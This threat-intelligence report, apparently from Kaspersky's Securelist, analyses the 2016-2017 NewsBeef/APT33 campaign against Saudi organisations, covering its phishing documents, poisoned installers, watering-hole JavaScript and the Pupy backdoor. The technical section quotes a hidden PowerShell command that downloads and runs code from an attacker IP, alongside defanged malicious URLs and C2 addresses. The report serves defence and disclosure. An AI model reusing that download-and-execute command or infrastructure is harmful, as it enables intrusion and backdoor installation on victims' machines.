Recently, the United States Cyber Command (USCYBERCOM Malware Alert
@CNMF_VirusAlert) highlighted several VirusTotal uploads of theirs – and the
executable objects relating to 2016 – 2017 NewsBeef/APT33 activity are interesting for a
variety of reasons. Before continuing, it’s important to restate yet again that we defend
customers, and research malware and intrusions, regardless of their source.
Accordingly, subscribers to our private APT intelligence reports receive unique and
extraordinary data on the signiﬁcant activity and campaigns of over 100 APTs from all
over the world, including this 2016-2017 NewsBeef /APT33 activity.
USCYBERCOM’s VirusTotal executable object uploads appeared in our January 2017
private report “NewsBeef Delivers Christmas Presence”, an examination of a change in
the tactics used in spear-phishing and watering hole attacks against Saudi Arabian
targets. Two ﬁles uploaded by USCYBERCOM are of particular interest. These were ﬁrst
seen Dec 2016 and Jan 2017:

In order to share insight into Cyber Command’s highlighted malware and its context,
some of our private report’s content will be re-written here. The January 2017 report
followed up on other private reports published on the group’s BeEF-related activity in
2015 and 2016. All of them cover a thread of mid-2015 activity continuing into 2016, then
resetting and advancing in 2016 and into 2017. Bear in mind that regardless of current
leaks, which do not always present exhaustive information on group participants, activity
from the region has had multiple overlaps and presents a confusion of internal
dynamics…

Executive summary
The NewsBeef APT previously engaged in long-term, elaborate social engineering
schemes that take advantage of popular social network platforms. Previous analysis of
the NewsBeef APT indicates that the group focuses on Saudi Arabian (SA) and Western
targets, and lacks advanced offensive technology development capabilities.
In previous campaigns, NewsBeef relied heavily on its namesake technology, the
Browser Exploitation Framework (BeEF). However, in the summer of 2016, the group
deployed a new toolset that includes macro-enabled Ofﬁce documents, PowerSploit, and
the Pupy backdoor. The most recent NewsBeef campaign uses this toolset in
conjunction with spearphishing emails, links sent over social media/standalone private
messaging applications, and watering hole attacks that leverage compromised highproﬁle websites (some belonging to the SA government). The group changed multiple
characteristics year over year – tactics, the malicious JavaScript injection strategically
placed on compromised websites, and command and control C2 infrastructure.
In a nutshell:
The NewsBeef actor deployed a new toolset in a campaign that focused primarily
on Saudi Arabian targets;
BeEF does not appear to be deployed as a part of the current campaign;
Compromised government and infrastructure-related websites are injected with
JavaScript that geolocates and redirects visitors to spoofed, attacker-controlled
web-servers;
Improvements in JavaScript injection and obfuscation may extend server
persistence;
NewsBeef continues to deploy malicious macro-enabled Ofﬁce documents,
poisoned legitimate Flash and Chrome installers, PowerSploit, and Pupy tools

Technical Analysis
The NewsBeef campaign is divided into two main attack vectors, spearphishing and
strategic web compromise (watering hole) attacks. The group’s spearphishing
component uses malicious, macroenabled, Microsoft Ofﬁce documents that deliver
PowerShell scripts. The scripts download poisoned installers (e.g. Flash, Citrix Client,
and Chrome) from an online presence (in at least one case, the group spoofed a
legitimate, well-known IT services organization). Once the installer is downloaded to a
victim machine, it runs PowerSploit scripts that in turn download and execute a fullfeatured Pupy backdoor.
On December 25, 2016, the NewsBeef APT stood up a server to host a new set of
Microsoft Ofﬁce documents (maintaining malicious macros and PowerShell scripts) to
support its spear-phishing operations. The group sent these documents (or links to them)
to targets via email, and over social network and standalone messaging clients.
To compromise websites and servers, the group identiﬁed vulnerable sites and injected
obfuscated JavaScript that redirected visitors to NewsBeef-controlled hosts (which
tracked victims and served malicious content). These compromised servers include

2/13

Saudi Arabian government servers and other high-value organizational identities
relevant to their targets.

Targets, social engineering, delivery chain
The majority of NewsBeef targets that our researchers have observed are located in SA.
Targeting proﬁles include:
Government ﬁnancial and administrative organizations
Government health organizations
Engineering and technical organizations
One British labor related government organization (targeted multiple times)
The bulk of the targets were affected through strategic web compromises, especially via
compromised government servers. However, Kaspersky Security Network (KSN) records
also contain links that victims clicked from the Outlook web client “outlook.live.com” as
well as attachments arriving through the Outlook desktop application. This behavior falls
in line with previous NewsBeef operations, where the group used other standalone
messaging clients to send malicious links. Interestingly, NewsBeef set up its server using
the hosting provider “Choopa, LLC, US”, the same hosting provider that the group used
in attacks over the summer of 2016.
The domain “ntg-sa[.]com” appears to
be an attempt by the NewsBeef actor
to spoof the legitimate Saudi IT
services organization, “National
Technology Group” (NTG) at,
“ntg.com[.]sa”. The malicious
documents served at the spoofed
website are shown below:

NTG is a legitimate company that provides IT services and support to SA government
organizations and communications ﬁrms (as well as international ﬁnancial groups and
retailers), making it a high-value identity. Spooﬁng the identity of an IT service provider is
a particularly important asset to threat actors that can abuse the inherent trust of IT
organizations to push software (which may appear suspicious if served from another
source). NTG’s IT focus and client list likely aided NewsBeef’s delivery of malicious
PowerShell-enabled Ofﬁce documents and poisoned installers.

‘Twas the night before | Securelist

In December 2016, the following active URLs were served from the spoofed NTG
identity. All of the poisoned installers are technologies that an IT support service may be
expected to deliver.
hxxps://ntg-sa[.]com/Downloads/ﬂashplayer23pp_xa_install.exe
hxxps://ntg-sa[.]com/Downloads/Citrix_Certiﬁcate.exe
hxxps://ntg-sa[.]com/Downloads/Chrome_Update.exe
In this scenario, the poisoned Flashplayer, Citrix, or Chrome installer drops the ﬁle
“install.bat”. The batch ﬁle runs the PowerShell command:
powershell.exe -w hidden -noni -nop -c “iex(New-Object
System.Net.WebClient).DownloadString(‘http://139.59.46[.]154:3485/eiloShaegae1′)
The command downloads “eiloShaegae1”, another PowerShell downloader script. This
second PowerShell downloader script downloads and runs the payload; a PowerSploit
ReﬂectivePEInjection script, “hxxp://139.59.46[.]154:3485/IMo8oosieVai”.
The script maintains and then decodes a base64 string. This base64 string, is the Pupy
backdoor DLL, which is loaded and run in-memory, never touching the disk. This Pupy
backdoor immediately communicates with 139.59.46[.1]54 over obfs3, posting collected
system data and retrieving commands.
This selection of “The Threebfuscator” for command and control (C2) communications is
interesting, because it is an obfuscating protocol used to mask Tor communications. It is
possible that the use of obfs3 indicates the attackers’ understanding of its effectiveness
against outbound connection monitoring.
Another notable spoofed domain used during this campaign is the “maps-modon[.]club”
domain. The domain “maps.modon.gov[.]sa” was compromised in December 2016, and
the “maps-modon[.]club” domain created on December 8, 2016. The domain shared the
https://securelist.com/twas-the-night-before/91599/

5/13

same IP address (45.76.32[.]252) as “ntg-sa[.]com”. Although we did not observe any
malicious documents retrieved from that domain, it is likely that the domain served the
same documents as ntg-sa[.]com. The ﬁlenames of the malicious Ofﬁce documents
(hosted at the spoofed NTG site) are relevant to typical IT and contracting resources and
indicate that this scheme relies on effective social engineering tactics related to human
resources and IT activities.
In other schemes, the attackers sent
macro-enabled Ofﬁce attachments
from spoofed law ﬁrm identities (or
other relevant service providers) to
targets in SA. The law ﬁrm in this
scheme is based in the United
Kingdom and is the sole location for
targets outside of SA for this campaign.
Below is a screenshot of a fake legal
proposal in Word doc format,
containing malicious macros and
PowerShell code.

The malicious document follows the same chain as the poisoned Flash player or Chrome
Installer:

Compromised servers and injected JavaScript
Starting in October 2016, NewsBeef compromised a set of legitimate servers (shown
below), and injected JavaScript to redirect visitors to hxxp://analyticsgoogle[.]org:69/Check.aspx:
The entire list of compromised servers
is exclusively Saudi Arabian, and
includes organizations from the
following industries:
Energy services for industrial
processes
Telecom engineering and
implementation services
Shipping and logistics
Metal engineering and
manufacturing
Information technology services
Cement and building materials
These recent attacks against
legitimate servers (when compared to previous NewsBeef activity) indicate that
NewsBeef operators have improved their technical skills, speciﬁcally their ability to
covertly inject JavaScript code into served web pages. Their injection and obfuscation
techniques enable the actor to serve the same JavaScript with every page visit to the
“watering hole” site as well as increase the difﬁculty of identifying the malicious
JavaScript source on compromised sites.
For example, on a Saudi government website, the NewsBeef APT delivered packed
JavaScript into the bottom of a referenced script that is included in every page served
from the site (the packed and unpacked JavaScript is shown below). The JavaScript
forces visiting web browsers to collect and send (via a POST request) web browser,
browser version, country of origin, and IP address data to the attacker controlled server
“jquerycodedownload[.]live/check.aspx”.
It is likely that this collection of visitor information represents an attempt to limit the
number of infections to a speciﬁc target subset and reduce the attacker’s operational
footprint. Although we did not identify injected JavaScript related to the “analyticsgoogle[.]org/check.aspx” redirections, it is likely that it performed similar data collection

and exﬁltration (via POST). This technique appears to be an improvement over the
simple .JPG beaconing which researchers observed in previous NewsBeef watering hole
attacks. Packed JavaScript:

The most trafﬁcked of the compromised sites (which redirect to “jquerycodedownload[.]live”) appears to be the government site at “scsb.gov[.]sa/portal/”. A high
volume of redirections from the compromised site continues into mid-January 2017.

Below is a list of compromised websites and the associated URL that serves the
injected, second layer JavaScript. Note that the JavaScript resource changes on every
compromised website among many other referenced JavaScript sources, making it
difﬁcult to track down the source of the malicious script per site:

Multiple other relevant sites were compromised and redirecting as well.

The Pupy backdoor
Pupy is an open source, multi-platform (Windows, Linux, OSX, Android), multi-function
backdoor. The backdoor is mainly written in Python and uses code from other open
source attack tools like PowerSploit, Mimikatz, laZagne, etc. Pupy can generate
backconnect or bindport payloads in multiple formats: PE executables (x86/x64) for
Windows, ELF binary/.so for Linux, reﬂective DLLs (x86/x64), pure Python ﬁles,
PowerShell, apk, and Rubber Ducky script (Windows).
The malicious DLL deployed by NewsBeef contains Python code, a Python interpreter,
and the MSVC runtime library as well as code that loads the Python interpreter, runs
Python code and exports some functions for Python. A conﬁguration string contains
base64-encoded Python code (packed with zlib) with transport conﬁguration and
information about C2 server addresses.
When initiated, the Python code attempts to retrieve and use SOCKS/HTTP proxy
settings from the victim’s computer. The Python code then tries to initiate a reverse
connection to the C2 server (139.59.46[.]154:3543) using a TCP protocol with RSA+AES
trafﬁc encryption and obfs3 transport using default keys from Pupy sources.

‘Twas the night before | Securelist

After a successful connection, NewsBeef Pupy sends information about the infected
computer and waits for commands (which take the form of modules) from the C2 server.
The C2 server can send modules with Python code and compiled Python C extensions.
The main functionality of the backdoor is implemented in packages (Python code,
compiled Python C extensions, compiled executable ﬁles) and modules (Python code).
Modules can directly access Python objects on the remote client using the RPyC
module. The Python modules win32com, win32api, and ctypes are used to interact with
the Win32 API. Attackers can use standard modules or write their own. All modules are
executed in the memory (a Pupy process can migrate between processes using the
corresponding module).

Conclusion
Previous reports on the NewsBeef APT noted the group’s reliance on open-source tools
to launch simple, yet effective attacks. Historically, the group has used BeEF to track
targets and deliver malicious payloads. However, as this recent campaign indicates, the
NewsBeef APT appears to have shifted its intrusion toolset away from BeEF and
towards macro-enabled malicious Ofﬁce documents, PowerSploit, and Pupy. Despite
this shift in toolset, the group still relies on old infrastructure as evidenced by their reuse
of servers hosted by the service providers Choopa and Atlantic.net.
The improvements in tactics, techniques and procedures appears to have paid off. The
most recent campaign indicates that the group was able to compromise a larger number
of sites including valuable, high-proﬁle SA government identities. However, despite these
improvements in technology, the NewsBeef APT continues to rely on social engineering
schemes and open-source tools – attributes that increase the chances of identiﬁcation.
NewsBeef attacks against Saudi Arabian organizations and individuals (as well as
targets in the European Union) are likely to continue. Additionally, researchers expect
that as the group evolves, its tasking will expand to other organizations doing business
with, or connected to Saudi Arabian organizations and individuals.
Due to the group’s speciﬁc target set, it is crucial that SA security teams, administrators,
and developers (especially web application administrators/developers) update their
WordPress, Joomla, and Drupal-based web applications and plugins – as these assets
are actively scanned and exploited by this APT.
